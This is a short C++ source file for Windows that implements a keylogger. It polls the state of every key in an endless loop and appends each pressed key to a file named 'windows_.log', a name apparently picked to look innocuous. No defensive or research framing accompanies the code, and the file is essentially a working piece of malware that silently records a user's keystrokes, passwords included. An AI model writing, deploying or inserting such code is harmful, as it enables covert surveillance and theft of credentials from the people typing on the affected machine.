#include <iostream>
#include <windows.h>
#include "keyboard/keys.h"
#include <fstream>
#include <unordered_map>

using namespace std;

unordered_map<int, string> getKeyboardKeys();

int main() {
    unordered_map<int, string> keys = getKeyboardKeys();
    ofstream file;

    while (true) {
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) == KEY_PRESSED) {
                try {
                    auto str_key = keys.at(i);
                    file.open("windows_.log", ios::app);
                    if (file.is_open()) {
                        file << str_key.c_str();
                        file.close();
                    }
                } catch (out_of_range &) {
                }
            }
        }
    }
}

unordered_map<int, string> getKeyboardKeys() {
    auto letter_keys = Keys::GetLetterKeys();
    auto number_keys = Keys::GetNumberKeys();
    auto windows_keys = Keys::GetWindowsKeys();
    auto symbol_keys = Keys::GetSymbolKeys();
    unordered_map<int, string> keys;
    keys.insert(letter_keys.begin(), letter_keys.end());
    keys.insert(number_keys.begin(), number_keys.end());
    keys.insert(windows_keys.begin(), windows_keys.end());
    keys.insert(symbol_keys.begin(), symbol_keys.end());
    return keys;
}
